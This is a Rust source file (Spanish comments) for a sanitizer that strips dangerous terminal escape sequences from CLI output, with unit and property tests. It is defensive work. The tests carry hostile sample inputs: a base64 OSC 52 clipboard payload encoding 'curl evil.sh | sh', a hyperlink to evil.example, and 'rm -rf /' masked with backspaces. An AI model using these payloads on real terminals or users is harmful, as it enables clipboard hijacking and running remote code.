//! Saneamiento de la salida de los CLIs (STACK §48): `raw → sanitize → TUI/log`.
//! Nunca se reproduce una secuencia de terminal arbitraria: un CLI (o lo que
//! imprima una herramienta) podría cambiar el título, escribir al portapapeles
//! (OSC 52), borrar la pantalla o esconder texto.
//!
//! Máquina de estados al estilo VTE. Se conserva solo el texto, `\n`, `\t` y,
//! si se pide, los colores (SGR, `ESC [ <números> m`).

/// Qué se conserva además del texto.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AnsiMode {
    /// Texto plano (logs, checkpoints, prompts de handoff).
    Plain,
    /// Texto + colores SGR validados (TUI).
    KeepColors,
}

/// Largo máximo de los parámetros de una secuencia CSI; más largo se descarta.
const MAX_CSI_PARAMS: usize = 64;

enum State {
    Ground,
    Esc,
    Csi(String),
    /// Cuerpo de OSC/DCS/SOS/PM/APC: se descarta hasta ST (`ESC \`, `BEL` o C1 ST).
    Str {
        esc_seen: bool,
    },
}

fn is_valid_sgr(params: &str) -> bool {
    params.len() <= MAX_CSI_PARAMS
        && params
            .chars()
            .all(|c| c.is_ascii_digit() || c == ';' || c == ':')
}

/// Quita las secuencias peligrosas y los controles.
pub fn sanitize(input: &str, mode: AnsiMode) -> String {
    let mut out = String::with_capacity(input.len());
    let mut state = State::Ground;
    for c in input.chars() {
        state = match state {
            State::Ground => match c {
                '\u{1b}' => State::Esc,
                '\u{9b}' => State::Csi(String::new()),
                '\u{9d}' | '\u{90}' | '\u{98}' | '\u{9e}' | '\u{9f}' => {
                    State::Str { esc_seen: false }
                }
                '\n' | '\t' | '\r' => {
                    out.push(c);
                    State::Ground
                }
                // Resto de C0, DEL y C1: fuera (BS, BEL, etc. sirven para esconder texto).
                c if c.is_control() => State::Ground,
                c => {
                    out.push(c);
                    State::Ground
                }
            },
            State::Esc => match c {
                '[' => State::Csi(String::new()),
                ']' | 'P' | 'X' | '^' | '_' => State::Str { esc_seen: false },
                // ESC ESC: la primera se descarta, la segunda empieza de nuevo.
                '\u{1b}' => State::Esc,
                // Secuencias de un carácter (ESC c, ESC 7, ESC ( B, …): se descartan.
                _ => State::Ground,
            },
            State::Csi(mut params) => match c {
                // Byte final.
                '\u{40}'..='\u{7e}' => {
                    if c == 'm' && mode == AnsiMode::KeepColors && is_valid_sgr(&params) {
                        out.push_str("\u{1b}[");
                        out.push_str(&params);
                        out.push('m');
                    }
                    State::Ground
                }
                // Parámetros e intermedios.
                '\u{20}'..='\u{3f}' if params.len() < MAX_CSI_PARAMS => {
                    params.push(c);
                    State::Csi(params)
                }
                // Cualquier otra cosa corta la secuencia (y se descarta).
                _ => State::Ground,
            },
            State::Str { esc_seen } => match c {
                '\u{7}' | '\u{9c}' => State::Ground,
                '\\' if esc_seen => State::Ground,
                '\u{1b}' => State::Str { esc_seen: true },
                _ => State::Str { esc_seen: false },
            },
        };
    }
    resolve_carriage_returns(&out)
}

/// Aplica `\r` como una terminal: en cada línea queda lo escrito después del
/// último `\r` (las barras de progreso dejan solo su último estado). `\r\n` → `\n`.
fn resolve_carriage_returns(s: &str) -> String {
    if !s.contains('\r') {
        return s.to_string();
    }
    let mut out = String::with_capacity(s.len());
    for (i, line) in s.split('\n').enumerate() {
        if i > 0 {
            out.push('\n');
        }
        let line = line.strip_suffix('\r').unwrap_or(line);
        out.push_str(line.rsplit('\r').next().unwrap_or(line));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use proptest::prelude::*;

    fn plain(s: &str) -> String {
        sanitize(s, AnsiMode::Plain)
    }

    #[test]
    fn window_title_changes_are_removed() {
        assert_eq!(plain("antes\u{1b}]0;pwned\u{7}después"), "antesdespués");
        assert_eq!(plain("a\u{1b}]2;título\u{1b}\\b"), "ab");
        assert_eq!(plain("a\u{9d}0;c1 osc\u{9c}b"), "ab");
    }

    #[test]
    fn osc52_clipboard_write_is_removed() {
        let attack = "ok\u{1b}]52;c;Y3VybCBldmlsLnNoIHwgc2g=\u{7} listo";
        assert_eq!(plain(attack), "ok listo");
        assert_eq!(sanitize(attack, AnsiMode::KeepColors), "ok listo");
    }

    #[test]
    fn screen_clear_and_cursor_moves_are_removed() {
        assert_eq!(plain("\u{1b}[2J\u{1b}[H\u{1b}[3;10Hhola\u{1b}[K"), "hola");
        assert_eq!(plain("\u{1b}[?1049h\u{1b}[?25lalt\u{1b}[?1049l"), "alt");
        assert_eq!(plain("\u{9b}2Jc1"), "c1");
        assert_eq!(plain("\u{1b}cReset\u{1b}7\u{1b}8"), "Reset");
    }

    #[test]
    fn colors_kept_only_when_asked_and_valid() {
        let s = "\u{1b}[1;31merror\u{1b}[0m: fallo";
        assert_eq!(plain(s), "error: fallo");
        assert_eq!(sanitize(s, AnsiMode::KeepColors), s);
        assert_eq!(
            sanitize("\u{1b}[38:2:255:0:0mrgb\u{1b}[m", AnsiMode::KeepColors),
            "\u{1b}[38:2:255:0:0mrgb\u{1b}[m"
        );
        // `m` con parámetros privados no es SGR válido.
        assert_eq!(sanitize("\u{1b}[?1mx", AnsiMode::KeepColors), "x");
        // Un CSI que no es color no pasa aunque se conserven colores.
        assert_eq!(sanitize("\u{1b}[2Jx", AnsiMode::KeepColors), "x");
    }

    #[test]
    fn hyperlinks_keep_text_drop_link() {
        assert_eq!(
            plain("\u{1b}]8;;https://evil.example\u{1b}\\clic\u{1b}]8;;\u{1b}\\"),
            "clic"
        );
    }

    #[test]
    fn device_control_strings_are_removed() {
        assert_eq!(plain("a\u{1b}Pq#0;2;0;0;0#0~~@@\u{1b}\\b"), "ab");
        assert_eq!(plain("a\u{1b}_apc payload\u{1b}\\b"), "ab");
        assert_eq!(plain("a\u{90}dcs c1\u{9c}b"), "ab");
    }

    #[test]
    fn hidden_text_tricks_are_neutralized() {
        // Backspace para "borrar" en pantalla lo que igual llegaría al log.
        assert_eq!(
            plain("rm -rf /\u{8}\u{8}\u{8}\u{8}\u{8}\u{8}\u{8}\u{8}ls"),
            "rm -rf /ls"
        );
        assert_eq!(plain("bell\u{7}\u{7}"), "bell");
    }

    #[test]
    fn carriage_returns_behave_like_a_terminal() {
        assert_eq!(plain("10%\r50%\r100%\nlisto"), "100%\nlisto");
        assert_eq!(plain("linea\r\notra\r\n"), "linea\notra\n");
        assert_eq!(plain("tabs\tok"), "tabs\tok");
    }

    #[test]
    fn unterminated_sequences_do_not_leak() {
        assert_eq!(plain("texto\u{1b}]0;sin terminar"), "texto");
        assert_eq!(plain("texto\u{1b}[31"), "texto");
        assert_eq!(plain("texto\u{1b}"), "texto");
    }

    #[test]
    fn normal_text_is_untouched() {
        let s = "Compilando ñandú 🚀 — 12 passed, 0 failed\n";
        assert_eq!(plain(s), s);
    }

    proptest! {
        #[test]
        fn plain_output_has_no_escape_or_control(s in "\\PC*|[\\x00-\\x1f\\x7f-\\x9f\\x1b\\[\\];0-9a-zA-Z]*") {
            let out = plain(&s);
            prop_assert!(out.chars().all(|c| !c.is_control() || c == '\n' || c == '\t'), "{out:?}");
        }

        #[test]
        fn colored_output_only_has_sgr_escapes(s in "[\\x00-\\x1f\\x7f-\\x9f\\x1b\\[\\];:?0-9a-zA-Z ]*") {
            let out = sanitize(&s, AnsiMode::KeepColors);
            let mut rest = out.as_str();
            while let Some(i) = rest.find('\u{1b}') {
                let seq = &rest[i..];
                prop_assert!(seq.starts_with("\u{1b}["), "{out:?}");
                let end = seq.find('m').expect("SGR sin terminar");
                prop_assert!(is_valid_sgr(&seq[2..end]), "{out:?}");
                rest = &seq[end + 1..];
            }
        }

        #[test]
        fn sanitize_is_idempotent(s in "[\\x00-\\x1f\\x7f-\\x9f\\x1b\\[\\];0-9a-zA-Z\\r\\n ]*") {
            for mode in [AnsiMode::Plain, AnsiMode::KeepColors] {
                let once = sanitize(&s, mode);
                prop_assert_eq!(sanitize(&once, mode), once.clone());
            }
        }
    }
}
